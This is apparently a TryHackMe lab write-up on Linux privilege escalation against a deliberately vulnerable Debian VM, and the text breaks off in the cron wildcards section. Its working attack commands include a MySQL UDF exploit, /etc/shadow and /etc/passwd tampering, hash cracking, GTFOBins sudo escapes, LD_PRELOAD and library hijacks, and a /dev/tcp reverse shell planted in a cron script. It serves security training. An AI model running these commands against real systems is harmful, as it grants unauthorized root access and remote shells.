# **Linux PrivEsc**

> Evan Diamantidis | June 2nd, 2022

--------------------------

<br />

# Table of contents

### [1. Deploy the Vulnerable Debian VM](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#1-deploy-the-vulnerable-debian-vm-1)
#### [&nbsp; 1.1: Deploy the machine and login to the "user" account using SSH.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#11-deploy-the-machine-and-login-to-the-user-account-using-ssh)
#### [&nbsp; 1.2: Run the "id" command. What is the result?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#12-run-the-id-command-what-is-the-result)

<br />

### [2. Service Exploits](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#2-service-exploits-1)
#### [&nbsp; 2.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#21-read-and-follow-along-with-the-above)

<br />

### [3. Weak File Permissions - Readable /etc/shadow](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#3-weak-file-permissions---readable-etcshadow-1)
#### [&nbsp; 3.1: What is the root user's password hash?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#31-what-is-the-root-users-password-hash)
#### [&nbsp; 3.2: What hashing algorithm was used to produce the root user's password hash?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Linux%20PrivEsc#32-what-hashing-algorithm-was-used-to-produce-the-root-users-password-hash)
#### [&nbsp; 3.3: What is the root user's password?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#33-what-is-the-root-users-password)

<br />

### [4. Weak File Permissions - Writable /etc/shadow](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#4-weak-file-permissions---writable-etcshadow-1)
#### [&nbsp; 4.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#41-read-and-follow-along-with-the-above)

<br />

### [5. Weak File Permissions - Writable /etc/passwd](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#5-weak-file-permissions---writable-etcpasswd-1)
#### [&nbsp; 5.1: Run the "id" command as the newroot user. What is the result?](https://github.com/EvanDiamantidis/Rooms/TryHackMe/tree/main/Linux%20PrivEsc#51-run-the-id-command-as-the-newroot-user-what-is-the-result)

<br />

### [6. Sudo - Shell Escape Sequences](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#6-sudo---shell-escape-sequences-1)
#### [&nbsp; 6.1: How many programs is "user" allowed to run via sudo?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#61-how-many-programs-is-user-allowed-to-run-via-sudo)
#### [&nbsp; 6.2: One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#62-one-program-on-the-list-doesnt-have-a-shell-escape-sequence-on-gtfobins-which-is-it)
#### [&nbsp; 6.3: Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#63-consider-how-you-might-use-this-program-with-sudo-to-gain-root-privileges-without-a-shell-escape-sequence)

<br />

### [7. Sudo - Environment Variables](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#7-sudo---environment-variables-1)
#### [&nbsp; 7.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#71-read-and-follow-along-with-the-above)

<br />

### [8. Cron Jobs - File Permissions](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#8-cron-jobs---file-permissions-1)
#### [&nbsp; 8.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#81-read-and-follow-along-with-the-above)

<br />

### [9: Cron Jobs - PATH Environment Variable](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#9-cron-jobs---path-environment-variable-1)
#### [&nbsp; 9.1: What is the value of the PATH variable in /etc/crontab?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#91-what-is-the-value-of-the-path-variable-in-etccrontab)

<br />

### [10: Cron Jobs - Wildcards](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#10-cron-jobs---wildcards-1)
#### [&nbsp; 10.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#101-read-and-follow-along-with-the-above)

<br />

### [11: SUID / SGID Executables - Known Exploits](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#11-suid--sgid-executables---known-exploits-1)
#### [&nbsp; 11.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#111-read-and-follow-along-with-the-above)

<br />

### [12: SUID / SGID Executables - Shared Object Injection](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#12-suid--sgid-executables---shared-object-injection-1)
#### [&nbsp; 12.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#121-read-and-follow-along-with-the-above)

<br />

### [13: SUID / SGID Executables - Environment Variables](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#13-suid--sgid-executables---environment-variables-1)
#### [&nbsp; 13.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#131-read-and-follow-along-with-the-above) 

<br />

### [14: SUID / SGID Executables - Abusing Shell Features (#1)](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#14-suid--sgid-executables---abusing-shell-features-1-1)
#### [&nbsp; 14.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#141-read-and-follow-along-with-the-above) 

<br />

### [15: SUID / SGID Executables - Abusing Shell Features (#2)](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#15-suid--sgid-executables---abusing-shell-features-2-1)
#### [&nbsp; 15.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#151-read-and-follow-along-with-the-above)

<br />

### [16: Passwords & Keys - History Files](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#16-passwords--keys---history-files-1)
#### [&nbsp; 16.1: What is the full mysql command the user executed?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#16-what-is-the-full-mysql-command-the-user-executed)

<br />

### [17: Passwords & Keys - History Files](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#17-passwords--keys---config-files)
#### [&nbsp; 17.1: What is the full mysql command the user executed?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#171-what-file-did-you-find-the-root-users-credentials-in)

<br />

### [18: Passwords & Keys - SSH Keys](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#18-passwords--keys---ssh-keys-1)
#### [&nbsp; 18.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#181-read-and-follow-along-with-the-above)

<br />

### [19: NFS](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#19-nfs-1)
#### [&nbsp; 19.1: What is the name of the option that disables root squashing?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#191-what-is-the-name-of-the-option-that-disables-root-squashing)

<br />

### [20: Kernel Exploits](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#20-kernel-exploits-1)
#### [&nbsp; 20.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#201-read-and-follow-along-with-the-above)

<br />

### [21: Privilege Escalation Scripts](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#21-privilege-escalation-scripts-1)
#### [&nbsp; 21: Experiment with all three tools, running them with different options. Do all of them identify the techniques used in this room?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Rooms/Linux%20PrivEsc#21-privilege-escalation-scripts-1)

<br />
<br />

## 1. Deploy the Vulnerable Debian VM

### 1.1: Deploy the machine and login to the "user" account using SSH.
```
No answer needed
```

Let's gather some information about our target with nmap. The `initial` output file under the `nmap` folder shows the following:
```
# Nmap 7.92 scan initiated Thu Jun  2 09:00:07 2022 as: nmap -sC -sV -oN nmap/initial 10.10.76.64
Nmap scan report for 10.10.76.64
Host is up (0.0087s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a4:6c:d1:c8:5b:03:f2:af:33:3f:84:15:cf:15:ed:ba (DSA)
|_  2048 08:84:3e:96:4d:9a:2f:a1:db:be:68:29:80:ab:f3:56 (RSA)
25/tcp   open  smtp    Exim smtpd 4.84
| smtp-commands: debian.localdomain Hello ip-10-8-76-102.eu-west-1.compute.internal [10.8.76.102], SIZE 52428800, 8BITMIME, PIPELINING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP
80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.16 (Debian)
111/tcp  open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      34933/udp   mountd
|   100005  1,2,3      58193/tcp   mountd
|   100021  1,3,4      49798/udp   nlockmgr
|   100021  1,3,4      50245/tcp   nlockmgr
|   100024  1          49563/tcp   status
|_  100024  1          52565/udp   status
2049/tcp open  nfs     2-4 (RPC #100003)
8080/tcp open  http    nginx 1.6.2
|_http-title: Welcome to nginx on Debian!
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.6.2
Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun  2 09:00:16 2022 -- 1 IP address (1 host up) scanned in 8.28 seconds
```

<br />

The credentials we will be using to connect via SSH are:

Username: `user`
<br />
Password: `password321`

<br />

There was an error in my attempt to SSH directly to the target machine remotely without any additional options using the standard SSH command:
```
ssh USERNAME@TARGET_IP
```
![image](https://user-images.githubusercontent.com/14150485/171621390-963177a3-7270-4187-b137-3db5283d1817.png)

The solution I found over at [AskUbuntu](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss) is to simply add the `-oHostKeyAlgorithms=+ssh-dss` option:
```
ssh -o HostKeyAlgorithms=ssh-dss USERNAME@TARGET_IP
```
![image](https://user-images.githubusercontent.com/14150485/171622487-e57fbb6b-955b-4594-92b9-dc1beb887fcf.png)

Please note that you can SSH to the target machine without any additional options using a TryHackMe AttackBox.

<br />

### 1.2: Run the "id" command. What is the result?
```
id
```
![image](https://user-images.githubusercontent.com/14150485/171623189-030512f6-f76e-4ae0-bf92-25b4004a665c.png)

The answer is:
```
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```


<br />
<br />

## 2. Service Exploits

<br />

This section might be a little advanced for some - It involves compiling the [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518) exploit, which is already downloaded as `raptor_udf2.c` under the `/home/user/tools/mysql-udf` directory on the target machine. This exploit allows us to take advantage of User Defined Functions (UDFs) to run system commands with root privileges using the MySQL service.

<br />

We first need to navigate to the file location at `/home/user/tools/mysql-udf`.
```
cd /home/user/tools/mysql-udf
```

Following the instructions provided on the exploit [link](https://www.exploit-db.com/exploits/1518) provided above, we need to compile the file before use:

```
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Once compiled, we can proceed to run `mysql` as `root` using a blank password:

```
mysql -u root -p
```

![image](https://user-images.githubusercontent.com/14150485/172220178-7765795d-509d-4c8b-8780-1041318062a9.png)

We can now proceed with the following commands on the `mysql` shell to create a User Defined Function (UDF) `do_system` using the exploit we compiled:

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

The table entries can be confirmed with the following command:

```
select * from mysql.func;
```

![image](https://user-images.githubusercontent.com/14150485/172221440-d3b92d41-c2bb-46a8-9584-9a51764dcfbb.png)

Now, we copy `/bin/bash` to `/tmp/rootbash` and set the SUID permission:

```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Exit the `mysql` shell by typing `exit` or `\q`. Running the `/tmp/rootbash` shell will grant root privileges on the machine.

```
/tmp/rootbash -p
```

![image](https://user-images.githubusercontent.com/14150485/172222490-17d98725-2456-4d71-9005-2c9aa3b83e45.png)

I strongly recommend following along the step by step instructions and researching the exploit and commands being used in parallel as part of your learning process.

<br />
	
### 2.1: Read and follow along with the above.
```
No answer needed
```

<br />
<br />

## 3. Weak File Permissions - Readable /etc/shadow
	
### 3.1: What is the root user's password hash?

<br />

Checking the contents of the `shadow` file we can apparently see the hash for `root` and `user`.

```
cat /etc/shadow
```

![image](https://user-images.githubusercontent.com/14150485/172003402-065807d6-2eaf-4937-b5b1-565797b6767a.png)

The answer is:

```
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```

<br />

### 3.2: What hashing algorithm was used to produce the root user's password hash?

<br />

Before we proceed with the next steps, we should ideally save the hash in a file locally.
<br />

There are multiple ways we can use to analyze the hash. We can either do it locally using `hashid`:

```
hashid hash.txt
```

![image](https://user-images.githubusercontent.com/14150485/172004011-49172bd5-9a81-4ac2-b079-7875cc231322.png)

<br />

Or, we can check the hash online at https://hashes.com/en/tools/hash_identifier:

![image](https://user-images.githubusercontent.com/14150485/172004046-62de3684-7ebd-445e-a760-768a5613e7f4.png)

Or, let John The Ripper analyze it for us while cracking it at the same time using the command provided on this task:

```
john --wordlist=/usr/share/wordlists/rockyou.txt FILENAME
```

![image](https://user-images.githubusercontent.com/14150485/172003660-85deec4a-bccf-4726-becd-362ca8af9391.png)

Regardless of the approach to this solution, it looks like we are dealing with a type `sha512crypt` hash.

```
sha512crypt
```

<br />

### 3.3: What is the root user's password?

<br />

Cracking the hash using John The Ripper reveals the password:

```
password123
```

We can now switch to `root` using the `su` command and password we just cracked:

```
su root
```

![image](https://user-images.githubusercontent.com/14150485/172005295-f5fb5d9d-0c4a-447d-82be-a97b0e443825.png)

<br />
<br />

## 4. Weak File Permissions - Writable /etc/shadow

<br />

This task is detailing the ease of editing writable `shadow` files to take advantage of passwords we can generate on our own using the `mkpasswd` command:

```
mkpasswd -m sha-512 PASSWORD_HERE
```

![image](https://user-images.githubusercontent.com/14150485/172007026-bc474a3f-7da7-46bd-a94e-6266076606f5.png)

We can now edit the `shadow` file and paste the generated hash between the first and second colons.

```
nano /etc/shadow
```

![image](https://user-images.githubusercontent.com/14150485/172007071-fc8ee104-118f-47c4-8d3c-326a8db4bdba.png)

To test the new password we simply save the file and `exit` from root back to user level.

```
su root
```

![image](https://user-images.githubusercontent.com/14150485/172006968-bd15e1cc-c571-46db-934a-7c09d226698c.png)

<br />

### 4.1: Read and follow along with the above.

```
No answer needed
```

Remember to exit out of the root shell before continuing!

<br />
<br />

## 5. Weak File Permissions - Writable /etc/passwd

### 5.1: Run the "id" command as the newroot user. What is the result?

<br />

Similar to the previous task, we can generate our own hashes that we can then use to manipulate writable `passwd` files to our advantage!

```
openssl passwd PASSWORD_HERE
```

![image](https://user-images.githubusercontent.com/14150485/172007767-48fd86a8-0836-4535-a7be-f9b1be8b52da.png)

We can now edit the `passwd` file, replacing the `x` between the first and second colons with the output from the previous command.

```
nano /etc/passwd
```

![image](https://user-images.githubusercontent.com/14150485/172007868-8344ae40-9007-4882-b8db-4a83e4b0eee6.png)

Saving the file and using the new credentials gives us root access to the machine again!

![image](https://user-images.githubusercontent.com/14150485/172007988-e014be78-d440-410d-9661-e327c2865bb9.png)

The `id` command releavs the answer to this task:

![image](https://user-images.githubusercontent.com/14150485/172008103-20231761-f5ba-42b2-8cba-98f95f060550.png)

```
uid=0(root) gid=0(root) groups=0(root)
```

<br />
<br />

## 6. Sudo - Shell Escape Sequences

### 6.1: How many programs is "user" allowed to run via sudo?

```
sudo -l
```

![image](https://user-images.githubusercontent.com/14150485/172009026-907e0e17-e4f3-4203-9cba-c8c9081bc767.png)

```
11
```

### 6.2: One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

<br />

Searching through the list of programs we just got using the `sudo -l` command over at [GTFOBins](https://gtfobins.github.io), there is only one not appearing on the list.

```
apache2
```

Apart from `apache2`, the rest can be used in one way or another for privilege escalation purposes on this machine.
<br />
I will be listing `sudo` examples for each exploit below - More detailed information can be found at [GTFOBins](https://gtfobins.github.io), which is also the source I used for these notes.

Remember to exit back after each root escalation before attempting another exploit!

<br />

**iftop**
---------

<br />

*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

```
sudo iftop
/bin/sh
```

The `sudo iftop` command launches the application. The `!` character will then enable user input that we can use to execute the `/bin/sh/` command within it:

![image](https://user-images.githubusercontent.com/14150485/172015777-41a49b0e-3ac5-44b8-a968-baad37f402b2.png)

This will grant root access to the machine!

![image](https://user-images.githubusercontent.com/14150485/172013044-6373b96c-10c0-468e-ac85-605b1c551990.png)

<br />

**find**
--------

<br />

*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

```
sudo find . -exec /bin/sh \; -quit
```

![image](https://user-images.githubusercontent.com/14150485/172013238-7a66d7ba-f032-49f9-a4ad-11a31378b90d.png)

<br />

**nano**
--------

<br />

*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

`sudo nano`
<br />
`^R^X` - `^R` in this case being `Ctrl + R`, which enables a dialog box in the application, and `^X` being `Ctrl + X` that enables command execution.
<br />
`reset; sh 1>&0 2>&0`


![image](https://user-images.githubusercontent.com/14150485/172014033-8ed77c1d-c3e8-40d8-9051-d6c116811d85.png)

After executing the command, any user input is not displayed in nano which can make it a little hard for us to see what it really does, however the above steps do grant root access to the target. We can confirm this by cleaning the active window using the `clear` command and then checking the active user using `whoami`.

![image](https://user-images.githubusercontent.com/14150485/172014113-282340b7-894c-47b5-b796-758ee6beb9f2.png)

<br />

**vim**
-------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

*(a) `sudo vim -c ':!/bin/sh'`*

*(b) This requires that vim is compiled with Python support. Prepend :py3 for Python 3.*
<br />
*`sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`*

*(c) This requires that vim is compiled with Lua support.*
<br />
*`sudo vim -c ':lua os.execute("reset; exec sh")'`*

<br />

The command demonstrated in example (a) seems to run successfully out of the box:

![image](https://user-images.githubusercontent.com/14150485/172015286-a65b7835-d9d9-4733-8554-845b915f2adb.png)

Examples (b) and (c) require compiling `vim` with Python and LUA respectively, as instructed.

<br />

**man**
-------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

```
sudo man man
!/bin/sh
```

![image](https://user-images.githubusercontent.com/14150485/172016119-72b9ebb8-61dc-4ef2-b38b-05e7ea6e35a9.png)

Once again, the exploit grants root access to the machine.

![image](https://user-images.githubusercontent.com/14150485/172016189-387d4b96-cde9-4895-825b-e2ab0aa8949f.png)

<br />

**awk**
-------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

![image](https://user-images.githubusercontent.com/14150485/172016444-46b9f785-5351-4a2f-9e14-76fbcceadba7.png)

<br />

**less**
--------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

```
sudo less /etc/profile
!/bin/sh
```

![image](https://user-images.githubusercontent.com/14150485/172016574-7fdc2c82-e035-4cca-8e0c-ffde770343f9.png)

The `!` character enables code execution which allows us to run the `/bin/sh` command that grants root access.

![image](https://user-images.githubusercontent.com/14150485/172016591-667f9643-cb9a-4983-ac32-fee3989cd201.png)

<br />

**ftp**
-------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

```
sudo ftp
!/bin/sh
```

![image](https://user-images.githubusercontent.com/14150485/172016751-ac465d2c-d464-4e31-bbd3-b29bdf3d3012.png)

<br />

**nmap**
--------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

*(a) Input echo is disabled.*

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

*(b) The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.

```
sudo nmap --interactive
nmap> !sh
```

<br />

Following the steps in example (a): 

![image](https://user-images.githubusercontent.com/14150485/172017005-1501a070-dbb1-46b8-a773-c7d29c8d90ee.png)

And example (b):

![image](https://user-images.githubusercontent.com/14150485/172017064-ba72bda4-e546-429a-9f47-2f9dd08e829a.png)

<br />

**more**
------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

```
TERM= sudo more /etc/profile
!/bin/sh
```

![image](https://user-images.githubusercontent.com/14150485/172017159-7e447b85-e637-499f-bd3c-f6e1e22668af.png)

Successfully escalated to root!

![image](https://user-images.githubusercontent.com/14150485/172017178-17bcd1aa-41dc-40d2-981d-fd65a24f3a76.png)

<br />

### 6.3: Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.

<br />

The answer to this is detailed in the following section.

```
No answer needed
```

<br />
<br />

## 7. Sudo - Environment Variables

<br />

Running the `sudo -l` command will reveal inherited environment variables, which should be listed as `env_keep`.

```
sudo -l
```

![image](https://user-images.githubusercontent.com/14150485/172237008-1b10abb9-2e7d-4ea0-8f46-b723ebeb1066.png)

The most important takeaway from this section should be that the `LD_PRELOAD` and `LD_LIBRARY_PATH` are both inherited from the user's environment. `LD_PRELOAD` loads a shared object before any others when a program is run. `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first.

Following along with the instructions, we proceed to create a shared object using the code in the `preload.c` via `gcc`.

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Running any programs we have permissions to use `sudo` with, setting the `LD_PRELOAD` value to the shared file we just created, will spawn a root shell for us!

```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

As an example, we can use `iftop` to get root:

```
sudo LD_PRELOAD=/tmp/preload.so iftop
```

![image](https://user-images.githubusercontent.com/14150485/172238459-7f95fa1f-6fec-432c-b888-1549c43ec4e7.png)

The same applies to `apache2` when ran with `sudo` permissions using the aforementioned `LD_PRELOAD` value:

```
sudo LD_PRELOAD=/tmp/preload.so apache2
```

![image](https://user-images.githubusercontent.com/14150485/172240755-276f7f6a-7d64-4a77-9ce7-533ebf973b6e.png)

<br />

Time to see if we can use `sudo` with `apache2` to get a root shell, utilizing the `LD_LIBRARY_PATH` this time.

Shared object dependencies are displayed using the `ldd` command. Let's get a list for the ones used with `apache2` on the target:

```
ldd /usr/sbin/apache2
```

![image](https://user-images.githubusercontent.com/14150485/172240466-64ccb199-388c-4589-a5b8-31a9af6ea522.png)

We can proceed to create a shared object using the same name as one of the libraries that were just listed.

```
gcc -o /tmp/libexpat.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Running `apache2` using `sudo` and setting the `LD_LIBRARY_PATH` to the folder location of the shared file we just created will escalate our privileges to root:

![image](https://user-images.githubusercontent.com/14150485/172242116-cb3a0ba4-a3b0-499b-a93f-451a185a3450.png)

<br />

As a final step in this task we will be renaming the `/tmp/libcrypt.so.1` shared file to a different process name and attempting to get root using the same `LD_LIBRARY_PATH`.

```
mv /tmp/libcrypt.so.1 /tmp/libpcre.so.3
```

![image](https://user-images.githubusercontent.com/14150485/172321131-b9cdc52c-1d13-47af-9f37-ab965948fb9f.png)

Attempting to run `apache2` with `sudo` however this time will display an error stating the `pcre_free` function was not found.

![image](https://user-images.githubusercontent.com/14150485/172321426-6c87fbd7-7c64-4fac-af09-03e14dd39428.png)

There are multiple ways we can use to add this function to the `library_path.c` file, the easiest being using the `echo` command to add a line at the end of the program with a void `pcre_free` function:

```
echo "void pcre_free(){}" >> /home/user/tools/sudo/library_path.c
```
Before our new `sudo` attempt we have to use the code in `library_path.c` with the new `libpcre.so.3` shared file:

```
gcc -o /tmp/libpcre.so.3 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Running `apache2` with `sudo` using the `LD_LIBRARY_PATH` should now successfully spawn a root shell:

```
sudo LD_LIBRARY_PATH=/tmp apache2
```

![image](https://user-images.githubusercontent.com/14150485/172322578-c461bb11-428b-4c9f-be67-feff7deea65a.png)

<br/>

### 7.1: Read and follow along with the above.

```
No answer needed
```

<br />
<br />

## 8. Cron Jobs - File Permissions

<br />

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.

<br />

We can read through the contents of this file to see the jobs running on the target machine.

```
cat /etc/crontab
```

![image](https://user-images.githubusercontent.com/14150485/172329760-0bb0d5b0-11a9-4afe-b1d2-b2674bf33638.png)

The `overwrite.sh` and `compress.sh` jobs have been scheduled to run every minute, something we can take advantage of to gain access to this machine. Let us `locate` the first file.

```
locate overwrite.sh
```

![image](https://user-images.githubusercontent.com/14150485/172330777-ed0a7342-49a4-4712-a9cd-f29480b91ce9.png)

```
la -la /usr/local/bin/overwrite.sh
```

![image](https://user-images.githubusercontent.com/14150485/172330956-081e6528-24cf-4945-8dac-54c8c8c96cb6.png)

Looks like we have write permissions on the file. Let's replace its contents per the instructions on the task with our local IP and port of choice.

```
#!/bin/bash
bash -i >& /dev/tcp/LOCAL_IP/LOCAL_PORT 0>&1
```

The next step is to set up a listener locally and wait for about a minute until the job executes on the target machine and attempts to connect to our IP using the specified port.

```
nc -lvnp LOCAL_PORT
```

After a short wait, we gain root access to the target!

![image](https://user-images.githubusercontent.com/14150485/172333307-7e70957d-60b4-4c83-bf11-5bd83a5d2c8e.png)

<br/>

### 8.1: Read and follow along with the above.

```
No answer needed
```

<br/>
<br/>

## 9: Cron Jobs - PATH Environment Variable

<br/>

Viewing the `crontab` contents we notice the `PATH` variable is starts with our user's home directory.

```
cat /etc/crontab
```

![image](https://user-images.githubusercontent.com/14150485/172364659-edd70214-5026-4a1b-8420-3863f47e0a84.png)

Follow the instructions on the task to create an `overwrite.sh` file in our `/home/user/` directory - We can easily do this with `nano` using the `nano /home/user/overwrite.sh` command and saving the file with the following contents:

```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

What this file will essentially do is copy the `/bin/bash` contents in a new `rootbash` file under the `/tmp` folder and set its permissions to an SUID executable. We now need to ensure the `overwrite.sh` file we created is an exectable as well so that its contents are executed when ran by cron.

```
chmod +x /home/user/overwrite.sh
```

![image](https://user-images.githubusercontent.com/14150485/172365994-72594fe1-4dbe-43e9-ace5-b5a1a6c9b0cc.png)

After cron picks up the task within a minute, running the `rootbash` file with SUID privileges using the `-p` option will spawn a root shell:

```
/tmp/rootbash -p
```

![image](https://user-images.githubusercontent.com/14150485/172368694-6042e738-ab95-4d48-a587-cffd74e7e0f0.png)

<br/>

Remember to remove the modified code, remove the `/tmp/rootbash` executable and `exit` out of the elevated shell before continuing as you will create this file again later in the room!

```
rm /home/user/overwrite.sh
rm /tmp/rootbash
exit
```

![image](https://user-images.githubusercontent.com/14150485/172369341-1c156902-9890-41fd-9c1b-b2b5bf813028.png)

<br/>

### 9.1: What is the value of the PATH variable in /etc/crontab?

<br/>

The full path was listed when we first viewed the contents of the `/etc/crontab` file.

```
/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

<br/>
<br/>

## 10: Cron Jobs - Wildcards

<br/>

Let's read through the other cron job script:

```
cat /usr/local/bin/compress.sh
```

![image](https://user-images.githubusercontent.com/14150485/172453181-b97b7c49-a00e-4d5c-9328-a28fdca19eec.png)

